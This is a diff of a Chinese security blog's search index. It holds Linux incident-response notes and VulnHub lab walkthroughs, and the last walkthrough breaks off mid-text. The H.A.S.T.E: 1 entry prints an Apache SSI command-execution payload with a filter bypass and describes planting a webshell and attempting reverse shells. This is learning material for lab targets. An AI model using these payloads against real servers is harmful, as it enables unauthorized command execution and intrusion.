-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/3.png"></p>
-<span id="more"></span>
-
-<h3 id="模块信息"><a href="#模块信息" class="headerlink" title="模块信息"></a>模块信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsmod</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/4.png"></p>
-<h2 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h2><h3 id="查看系统所有用户信息"><a href="#查看系统所有用户信息" class="headerlink" title="查看系统所有用户信息"></a>查看系统所有用户信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd  </span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/5.png"></p>
-<h3 id="分析超级权限账户"><a href="#分析超级权限账户" class="headerlink" title="分析超级权限账户"></a>分析超级权限账户</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">awk -F: &#x27;&#123;if($3==0)print $1&#125;&#x27; /etc/passwd</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/6.png"></p>
-<h3 id="查看可登录的账户"><a href="#查看可登录的账户" class="headerlink" title="查看可登录的账户"></a>查看可登录的账户</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd | grep &#x27;/bin/bash&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/7.png"></p>
-<h3 id="查看用户错误的登录信息"><a href="#查看用户错误的登录信息" class="headerlink" title="查看用户错误的登录信息"></a>查看用户错误的登录信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lastb</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/8.png"></p>
-<h3 id="查看所有用户最后的登录信息"><a href="#查看所有用户最后的登录信息" class="headerlink" title="查看所有用户最后的登录信息"></a>查看所有用户最后的登录信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lastlog | more</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/9.png"></p>
-<h3 id="查看用户最近登录信息"><a href="#查看用户最近登录信息" class="headerlink" title="查看用户最近登录信息"></a>查看用户最近登录信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">last</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/10.png"></p>
-<h3 id="查看当前用户登录系统情况"><a href="#查看当前用户登录系统情况" class="headerlink" title="查看当前用户登录系统情况"></a>查看当前用户登录系统情况</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">who</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/11.png"></p>
-<h3 id="查看空口令账户"><a href="#查看空口令账户" class="headerlink" title="查看空口令账户"></a>查看空口令账户</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">awk -F: &#x27;length($2)==0 &#123;print $1&#125;&#x27; /etc/shadow</span><br></pre></td></tr></table></figure>
-
-<h2 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h2><p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/12.jpg"></p>
-<h2 id="任务计划"><a href="#任务计划" class="headerlink" title="任务计划"></a>任务计划</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">crontab -u root -l</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/13.png"></p>
-<p>这条显示的命令为腾讯云的资源监控</p>
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/14.jpg">                                    </p>
-<h1 id="进程排查"><a href="#进程排查" class="headerlink" title="进程排查"></a>进程排查</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -antlp | more #查看网络连接</span><br><span class="line"></span><br><span class="line">ls -alt /proc/【PID】#查看对应的可执行程序</span><br><span class="line"></span><br><span class="line">lsof -p PID #查看该进程打开的文件</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kill -9 PID #结束进程</span><br><span class="line"></span><br><span class="line">rm -rf filename #删除目标文件</span><br><span class="line"></span><br><span class="line">若删除不成功lsattr filename查看是否被加上i属性然后使用chattr -i filename移除i属性，在进行文件的删除</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -ef | awk &#x27;&#123;print&#125;&#x27; | sort -n | uniq &gt; 1  #查看隐藏进程123</span><br><span class="line"></span><br><span class="line">ls /proc | sort -n | uniq &gt; 2</span><br><span class="line"></span><br><span class="line">diff 1 2 #对比</span><br></pre></td></tr></table></figure>
-
-<p>可以用top查看资源占用情况，可针对性的重点排查cpu占用率较高的进程</p>
-<h1 id="服务排查"><a href="#服务排查" class="headerlink" title="服务排查"></a>服务排查</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chkconfig --list  #查看系统运行的服务</span><br></pre></td></tr></table></figure>
-
-<p>等级0表示：表示关机</p>
-<p>等级1表示：单用户模式</p>
-<p>等级2表示：无网络连接的多用户命令行模式</p>
-<p>等级3表示：有网络连接的多用户命令行模式</p>
-<p>等级4表示：不可用</p>
-<p>等级5表示：带图形界面的多用户模式</p>
-<p>等级6表示：重新启动</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service --status-all  #可查看所有服务的状态</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/15.png">        </p>
-<h1 id="文件痕迹排查"><a href="#文件痕迹排查" class="headerlink" title="文件痕迹排查"></a>文件痕迹排查</h1><blockquote>
-<p>“我不知道怎么形容，但它一直存在”</p>
-</blockquote>
-<hr>
-]]></content>
-      <categories>
-        <category>蓝队学习之路</category>
-      </categories>
-      <tags>
-        <tag>应急响应</tag>
       </tags>
   </entry>
   <entry>
@@ -833,6 +754,85 @@
 <p>总结的内容到这里就要结束了，当然整本书300+页，后面有很多经典案例分享，如挖矿木马，勒索病毒，流量劫持等等。总的来说，是一本非常可读的书，值得想了解应急响应的同学学习一番。这些也有可能给红队的同学一些小启发哟~</p>
 <blockquote>
 <p>若不去改变，明天永远只是今天的重演。</p>
+</blockquote>
+<hr>
+]]></content>
+      <categories>
+        <category>蓝队学习之路</category>
+      </categories>
+      <tags>
+        <tag>应急响应</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网络安全应急响应Linux篇</title>
+    <url>/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/</url>
+    <content><![CDATA[<p>这篇笔记参考了奇安信安服团队所写的书——《网络安全应急响应技术实战指南》</p>
+<p>算是自己看书和学习的一个总结和整理。这里是对Linux的小总结</p>
+<p>【正在更新中,其实大部分需要掌握的基础部分写的差不多了，虽然坑没填完但也够看了】</p>
+<h1 id="系统排查"><a href="#系统排查" class="headerlink" title="系统排查"></a>系统排查</h1><h2 id="Linux系统"><a href="#Linux系统" class="headerlink" title="Linux系统"></a>Linux系统</h2><h3 id="cpu信息"><a href="#cpu信息" class="headerlink" title="cpu信息"></a>cpu信息</h3><p>【lscpu】命令可查看cpu相关信息，包括型号、主频、内核等</p>
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/1.png"></p>
+<h3 id="操作系统信息"><a href="#操作系统信息" class="headerlink" title="操作系统信息"></a>操作系统信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname -a </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/2.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /proc/version</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/3.png"></p>
+<span id="more"></span>
+
+<h3 id="模块信息"><a href="#模块信息" class="headerlink" title="模块信息"></a>模块信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsmod</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/4.png"></p>
+<h2 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h2><h3 id="查看系统所有用户信息"><a href="#查看系统所有用户信息" class="headerlink" title="查看系统所有用户信息"></a>查看系统所有用户信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd  </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/5.png"></p>
+<h3 id="分析超级权限账户"><a href="#分析超级权限账户" class="headerlink" title="分析超级权限账户"></a>分析超级权限账户</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">awk -F: &#x27;&#123;if($3==0)print $1&#125;&#x27; /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/6.png"></p>
+<h3 id="查看可登录的账户"><a href="#查看可登录的账户" class="headerlink" title="查看可登录的账户"></a>查看可登录的账户</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd | grep &#x27;/bin/bash&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/7.png"></p>
+<h3 id="查看用户错误的登录信息"><a href="#查看用户错误的登录信息" class="headerlink" title="查看用户错误的登录信息"></a>查看用户错误的登录信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lastb</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/8.png"></p>
+<h3 id="查看所有用户最后的登录信息"><a href="#查看所有用户最后的登录信息" class="headerlink" title="查看所有用户最后的登录信息"></a>查看所有用户最后的登录信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lastlog | more</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/9.png"></p>
+<h3 id="查看用户最近登录信息"><a href="#查看用户最近登录信息" class="headerlink" title="查看用户最近登录信息"></a>查看用户最近登录信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">last</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/10.png"></p>
+<h3 id="查看当前用户登录系统情况"><a href="#查看当前用户登录系统情况" class="headerlink" title="查看当前用户登录系统情况"></a>查看当前用户登录系统情况</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">who</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/11.png"></p>
+<h3 id="查看空口令账户"><a href="#查看空口令账户" class="headerlink" title="查看空口令账户"></a>查看空口令账户</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">awk -F: &#x27;length($2)==0 &#123;print $1&#125;&#x27; /etc/shadow</span><br></pre></td></tr></table></figure>
+
+<h2 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h2><p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/12.jpg"></p>
+<h2 id="任务计划"><a href="#任务计划" class="headerlink" title="任务计划"></a>任务计划</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">crontab -u root -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/13.png"></p>
+<p>这条显示的命令为腾讯云的资源监控</p>
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/14.jpg">                                    </p>
+<h1 id="进程排查"><a href="#进程排查" class="headerlink" title="进程排查"></a>进程排查</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -antlp | more #查看网络连接</span><br><span class="line"></span><br><span class="line">ls -alt /proc/【PID】#查看对应的可执行程序</span><br><span class="line"></span><br><span class="line">lsof -p PID #查看该进程打开的文件</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kill -9 PID #结束进程</span><br><span class="line"></span><br><span class="line">rm -rf filename #删除目标文件</span><br><span class="line"></span><br><span class="line">若删除不成功lsattr filename查看是否被加上i属性然后使用chattr -i filename移除i属性，在进行文件的删除</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -ef | awk &#x27;&#123;print&#125;&#x27; | sort -n | uniq &gt; 1  #查看隐藏进程123</span><br><span class="line"></span><br><span class="line">ls /proc | sort -n | uniq &gt; 2</span><br><span class="line"></span><br><span class="line">diff 1 2 #对比</span><br></pre></td></tr></table></figure>
+
+<p>可以用top查看资源占用情况，可针对性的重点排查cpu占用率较高的进程</p>
+<h1 id="服务排查"><a href="#服务排查" class="headerlink" title="服务排查"></a>服务排查</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chkconfig --list  #查看系统运行的服务</span><br></pre></td></tr></table></figure>
+
+<p>等级0表示：表示关机</p>
+<p>等级1表示：单用户模式</p>
+<p>等级2表示：无网络连接的多用户命令行模式</p>
+<p>等级3表示：有网络连接的多用户命令行模式</p>
+<p>等级4表示：不可用</p>
+<p>等级5表示：带图形界面的多用户模式</p>
+<p>等级6表示：重新启动</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service --status-all  #可查看所有服务的状态</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/15.png">        </p>
+<h1 id="文件痕迹排查"><a href="#文件痕迹排查" class="headerlink" title="文件痕迹排查"></a>文件痕迹排查</h1><blockquote>
+<p>“我不知道怎么形容，但它一直存在”</p>
 </blockquote>
 <hr>
 ]]></content>
@@ -1181,6 +1181,89 @@
       </tags>
   </entry>
   <entry>
+    <title>靶机H.A.S.T.E: 1渗透记录</title>
+    <url>/2023/04/08/%E9%9D%B6%E6%9C%BAH-A-S-T-E-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<p>老年人复健</p>
+<p>虽然学安全的时候经常摸鱼，但是不学安全的日子人就完全废掉了orz</p>
+<blockquote>
+<p> 下载地址：<a href="https://www.vulnhub.com/entry/haste-1,203/">https://www.vulnhub.com/entry/haste-1,203/</a></p>
+</blockquote>
+<p>△注：该靶机仅涉及外网打点+拿shell，无后续提权考点</p>
+<p>本人水平极差，小白一枚，勿喷</p>
+<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>毫无知识储备的大脑，一台kali2021.2，一台刚下载好还热乎的靶机</p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>还是之前的那些步骤拿到打包好的靶机之后看一眼mac地址</p>
+<p><img src="/2023/04/08/%E9%9D%B6%E6%9C%BAH-A-S-T-E-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png"></p>
+<p>确认一下目标ip</p>
+<p><img src="/2023/04/08/%E9%9D%B6%E6%9C%BAH-A-S-T-E-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.png"></p>
+<p>开扫 其实参数有时候没必要那么多，扫描讲究的是速度和效率。等待的过程是漫长的</p>
+<p><img src="/2023/04/08/%E9%9D%B6%E6%9C%BAH-A-S-T-E-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.png"></p>
+<p>中间件千疮百孔apache  这个时候百度一下2.4.18版本有啥漏洞，就可以直接结束战斗啦（</p>
+<p>80端口开着，走，串个门吧</p>
+<p><img src="/2023/04/08/%E9%9D%B6%E6%9C%BAH-A-S-T-E-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.png"></p>
+<p><img src="/2023/04/08/%E9%9D%B6%E6%9C%BAH-A-S-T-E-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/5.png"></p>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>虽然但是，这个框铁有问题</p>
+<p>内容概要：可以花钱请这个组织搞事，交互框提交的是网址和留言，价格2.37 BTC，这个靶机是17年的，当时BTC价格已经很高了。</p>
+<p>没记错的话17年的时候著名的经典案例——WannaCry勒索病毒现身并席卷全球，这是比特币映入大众视野的关键事件之一，从此之后比特币的身价居高不下。</p>
+<p>提交之后的回显</p>
+<p><img src="/2023/04/08/%E9%9D%B6%E6%9C%BAH-A-S-T-E-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png"></p>
+<p>现在还是一个无头苍蝇乱撞的状态 再扫扫目录吧</p>
+<p><img src="/2023/04/08/%E9%9D%B6%E6%9C%BAH-A-S-T-E-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.png"></p>
+<p>漏洞无非就那几种，重点关注网页，中间件。</p>
+<p>这种题目既然能扫出/robots那就重点关注</p>
+<p><img src="/2023/04/08/%E9%9D%B6%E6%9C%BAH-A-S-T-E-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.png"></p>
+<p><img src="/2023/04/08/%E9%9D%B6%E6%9C%BAH-A-S-T-E-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.png"></p>
+<p><img src="/2023/04/08/%E9%9D%B6%E6%9C%BAH-A-S-T-E-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.png"></p>
+<p>网页的备份文件，看了看，没有太多直观的信息</p>
+<p>另外值得关注的就是/ssi的目录</p>
+<p><img src="/2023/04/08/%E9%9D%B6%E6%9C%BAH-A-S-T-E-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.png"></p>
+<p>其实当扫描器显示/ssi目录的那一刻，就可以确定这是个什么漏洞了</p>
+<p>来自中间件Apache的SSI远程命令执行</p>
+<p>&lt;! –注释文本–&gt;   &lt;! –#ssi命令–&gt; 其实我真没搞懂ssi是啥，只模糊知道ssi是个动态程序，可以做到只有一端实时接收变化实时反馈。简单来说的话</p>
+<p>服务器（不识别ssi时）：看不懂不管</p>
+<p>浏览器：注释？不管</p>
+<p>服务器（识别ssi时）：哎，有ssi命令，我仔细看看有哪些ssi命令，我执行执行</p>
+<p>此时，所有的&lt;! –#ssi命令–&gt; 直接变成结果</p>
+<p>回到正题，拿着payload直接试一下</p>
+<p><img src="/2023/04/08/%E9%9D%B6%E6%9C%BAH-A-S-T-E-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.png"></p>
+<p>有过滤，可以fuzz一下看看过滤了什么，不过这里没啥必要哈</p>
+<p>Target过滤了&lt;&gt;，我不知道咋办，我很菜。这个漏洞的payload没了尖括号咋执行啊（挠头）</p>
+<p>但是第二个feedback框把exec换成大写就完事了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;id&quot; --&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/04/08/%E9%9D%B6%E6%9C%BAH-A-S-T-E-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.png"></p>
+<p>不钻牛角尖，也不浪费时间，虽然这两个框框过滤的东西不一样，但是只要能执行一个就够了</p>
+<p>上传统艺能传个shell (http服务+wget)</p>
+<p><img src="/2023/04/08/%E9%9D%B6%E6%9C%BAH-A-S-T-E-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.png"></p>
+<p><img src="/2023/04/08/%E9%9D%B6%E6%9C%BAH-A-S-T-E-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.png"></p>
+<p>整了半天不知道怎么触发反弹shell，又传了个一句话连蚁剑</p>
+<p>bash反弹不过去 php不行 perl也不中 试了py也是不行 nc反向链接没有e 就算nc连上了立马断不知道为什么。</p>
+<p><img src="/2023/04/08/%E9%9D%B6%E6%9C%BAH-A-S-T-E-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.png"></p>
+<p>……又卡了，这个靶机好像没法提权</p>
+<p><img src="/2023/04/08/%E9%9D%B6%E6%9C%BAH-A-S-T-E-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.png"></p>
+<p>最后无奈的宣布渗透结束。</p>
+<hr>
+<p>PS：事后网上搜了一下。该靶机作者并未安排提权环节，靶机没有涉及后续获取root的知识考察。</p>
+<p>问了朋友，朋友表示没见过到ssi，囧，这个漏洞了解即可，也是一个思路哈哈哈</p>
+<p>我搜到了别人的笔记，都是msf生成的py然后 python xx.py，(╯▽╰)对不起我忘了还有msf可以一试。但是用的都是py也不是php，可能php文件就没法执行吧。看到有一篇笔记就是nc反弹shell就成功了，用的php，怎么做到的？魔法吗……</p>
+<p>菜的人就是这样的，看什么都神奇，看什么都是魔法。笔记的作者一张回连成功的截图一笔带过，留下了一脸茫然的我orz</p>
+<p>还看到有个笔记还在功能框框里执行chmod，我试了，执行前后毫无变化，没权限执行。</p>
+<p><strong>可能别人都没有问题，只是本人是个二逼。</strong></p>
+<p>并不是收集到的所有信息都用上了，过程有取巧的成分。事后又去百度搜到了一个包含 CGI、SSI 和 PHP 支持的配置文档</p>
+<p><a href="https://www.oschina.net/question/23734_28163">https://www.oschina.net/question/23734_28163</a></p>
+<p>没有权限apache文件夹打不开看不到，备份文件那个配置好像也能支持，或者不支持也实属正常（名为oldconfig），不过/robots确实这一步没啥有用的信息</p>
+<hr>
+<blockquote>
+<p>正视痛苦，忠于体验</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>靶机渗透记录</category>
+      </categories>
+      <tags>
+        <tag>靶机渗透记录</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>靶机Hemisphere-Gemini渗透记录</title>
     <url>/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>靶机Hemisphere-Gemini×1<br>渗透机kali 2021.2×1 和靶机在同一网段<br>如果网卡不一致还需要先改一下靶机网卡<br>靶机很简单很简单，放轻松~</p>
@@ -1206,6 +1289,52 @@
 <hr>
 <blockquote>
 <p>落去君休惜，飞来我自知。<br>莺愁蝶倦晚芳时，纵是明春再见隔年期。</p>
+</blockquote>
+<hr>
+]]></content>
+      <categories>
+        <category>靶机渗透记录</category>
+      </categories>
+      <tags>
+        <tag>靶机渗透记录</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>靶机The Planets: Earth渗透记录</title>
+    <url>/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<p>前段时间忙于比赛，现在要继续开始学习了，不过又因为期末了所以靶机渗透更新的还是很慢…<br>本人学疏才浅，大佬们轻喷…</p>
+<hr>
+<blockquote>
+<p>下载地址：<a href="https://www.vulnhub.com/entry/the-planets-earth,755/">https://www.vulnhub.com/entry/the-planets-earth,755/</a></p>
+</blockquote>
+<hr>
+<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>靶机The Planets: Earth×1  NAT模式<br>渗透机kali 2021.2×1 和靶机在同一网段<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png"></p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>用arp-scan扫描ip，然后用mac地址确定目标<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.png"><br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.png"><br>扫扫扫</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.155.164</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.png"><br>根据nmap扫描的结果可以发现我们是需要加host才能打开那两个网址<br>访问靶机ip也就一个服务开启的默认界面<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/5.png"><br>加上host之后打开</p>
+<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png"></p>
+<span id="more"></span>
+<p>测试界面，啊我不信<br>另外一个地址打开后是类似一个留言功能的业务<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.png"><br>好像没啥漏洞，不过发送记录会展示在页面，发现了三串数字</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40</span><br><span class="line"></span><br><span 